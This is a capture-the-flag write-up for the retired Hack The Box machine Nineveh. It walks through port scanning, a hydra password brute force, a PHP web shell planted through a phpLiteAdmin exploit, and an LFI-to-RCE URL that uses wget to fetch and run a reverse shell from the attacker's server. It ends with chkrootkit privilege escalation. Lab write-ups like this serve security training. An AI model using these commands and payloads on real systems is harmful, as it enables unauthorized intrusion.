---
layout: default
title: HTB -- NINEVEH
---

# NINEVEH 

![Screenshot_20220523_050328](https://user-images.githubusercontent.com/24994796/169735651-d11e0259-8e44-481d-9469-c2de4a931734.png)

This is a retired box with some nice concepts
Let's Jump right into it
Upon spawning the machine we are given an IP address

# Recon

Enumerating is very crucial, first let's see the ports that are open
Running an NMAP scan we get

![Screenshot_20220523_050503](https://user-images.githubusercontent.com/24994796/169736068-740ef7e9-67f2-4ea0-8564-afd803dbde02.png)

Only two ports are open port 80 and 443
- HTTP and HTTPS

So fuzzing the https we got some directories, we find a login page on both one at department the other at dbbut we can't do anything without logging in, same with the http

![Screenshot_20220523_055355](https://user-images.githubusercontent.com/24994796/169740328-1e85f12a-327c-4c73-86ba-db76abaac9ab.png)

# Initial foothold

Considering we havn't seen anything suspicous from our directory fuzzing, we attempting bruteforcing for the password using hydra

![Screenshot_20220521_051414](https://user-images.githubusercontent.com/24994796/169737324-62c906df-a783-454e-a5e8-fcfd7b8d0234.png)

Doesn't really take time to get the http login password, same with the https

To crack login password with hydra is quite simple as long as it has it's password in the wordlist
```hydra -l "admin" -u /usr/share/wordlists/rockyou.txt machine IP http-post-form "/path-of-request:reuest-body:error"```

You change the request body's username and password to ^USER^ & password ^PASS^
Path of request is the login directory 
The request body can be gotten fron firefox dev tools network option
The error is what you get after inputing wrong credentials
NOTE: if it's https it'll be http-post-form

![Screenshot_20220521_051404](https://user-images.githubusercontent.com/24994796/169738349-dbb1d0d3-2bd7-4fe5-9711-10a64aa235bd.png)

An Example of how it looks

# Initial Access

So Yh Now we have the user login for both services, Checking the https service first We get this 

![Screenshot_20220523_054452](https://user-images.githubusercontent.com/24994796/169739855-1d107ad1-0b9a-42bd-a276-9f2ffb8e1682.png)

We see it runs phpliteadmin v 1.9 - phpLiteAdmin is a web-based SQLite database admin tool written in PHP
There's an exploit on it on exploitdb and github

![Screenshot_20220523_055622](https://user-images.githubusercontent.com/24994796/169741579-8a7f5fdf-d3a5-4429-a1b5-fdf6c14f6be5.png)

This is easier to understand [GITHUB EXPLOIT](https://github.com/F-Masood/PHPLiteAdmin-1.9.3---Exploit-PoC) modify the malicious code to ```<?php system($_GET["cmd"])?>```

Heading back to our http /department directory
We see some directories, heading to notes we get this 

![Screenshot_20220521_064551](https://user-images.githubusercontent.com/24994796/169742132-1a2aa91c-3d95-4c62-a13d-c3c4568100f1.png)

Looking at the url it looks like an lfi is possible and in the github exploit, it did hint at lfi if you don't get rce
After a series of trial & error we get the lfi to rce and we can execute commands

![Screenshot_20220521_053145](https://user-images.githubusercontent.com/24994796/169742830-3ae23195-3402-4e5a-9e74-a64ee5d542d8.png)

From the rce we download a php revshel hosted on our server 

```http://nineveh.htb/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/saint.php&cmd=cd%20/tmp;id%20;%20pwd;%20whoami;%20wget%2010.10.14.24:8000/htbrev.php%20;%20ls%20-la%20;%20chmod%20+x%20htbrev.php%20;%20ls%20-la%20;%20php%20htbrev.php;%20id```

![Screenshot_20220521_055227](https://user-images.githubusercontent.com/24994796/169743188-7cafbda7-69df-4023-a4f4-3379b86d11f3.png)

# Privilege Escalation

On catching our shell we run a series of enumeration 
We locate the secure notes directories that was hinted to at notes
And the Image looks quite large, larger than it's predecessor by a lot, we try stringing it
But we cn't get all the files there, noticing the file path it's a https directory se we head to the directory, It displays an image, we download the image

![Screenshot_20220523_054406](https://user-images.githubusercontent.com/24994796/169744041-9ccce2a9-3388-48dc-81d3-0728dcd6cece.png)

We string it on out machine, we get both id_rsa (private key) and id_rsa.pub (public key)

But during our port scan we didn't get any ssh port open, so we run ```ss -tulnp``` to see listening ports on the machine 

If a port that didn't turn up in our scans is listening we can port forward to that port

![Screenshot_20220521_064157](https://user-images.githubusercontent.com/24994796/169744585-61eb7185-6593-49aa-83a8-672f142afcb9.png)

![Screenshot_20220521_065045](https://user-images.githubusercontent.com/24994796/169744602-81fb2b64-3401-4d1e-87df-4965432d1ede.png)

We tranfer the gotten id_rsa to the machine via hosting on a python server then downloading it to the victim machine
change it's permissions ```chmod 600 id_rsa```

Running linpeas (enumeration script)

We see a cron job running and we see some paths variable set

![Screenshot_20220521_075244](https://user-images.githubusercontent.com/24994796/169745170-96b2b0a8-cf6e-4fe2-91fc-71f7906539f0.png)

![Screenshot_20220521_075221](https://user-images.githubusercontent.com/24994796/169745181-1dd34d51-9994-41b8-8c19-0e27bfcef224.png)

so now reading the reports, it seems something is running

let's get pspy64 to enumerate all processes 

![Screenshot_20220523_065548](https://user-images.githubusercontent.com/24994796/169746255-04ee35ae-54f3-4a58-a291-e67f61f5882b.png)

We see lot's of /usr/bin/chkrootkit 
looking up chkrootkit we see there's an exploit for it

![Screenshot_20220523_065746](https://user-images.githubusercontent.com/24994796/169746565-d68f36c9-8818-4257-9f51-0b19742e998a.png)

![Screenshot_20220521_072335](https://user-images.githubusercontent.com/24994796/169746677-22ba5665-a4d9-4def-8c94-1c203ecb3048.png)

So now we create a file named update in /tmp give it execution rights then we wait for ten minutes

Ignore my previous attempts on top xD i tried creating the bin path and creating an rm executable xD

# AND WE ARE DONE

Hit me up on [Twitter](https://twitter.com/abdulmalik_ttg) if you run into any issues



<br> <br>
[Back To Home](../../index.md)
<br>



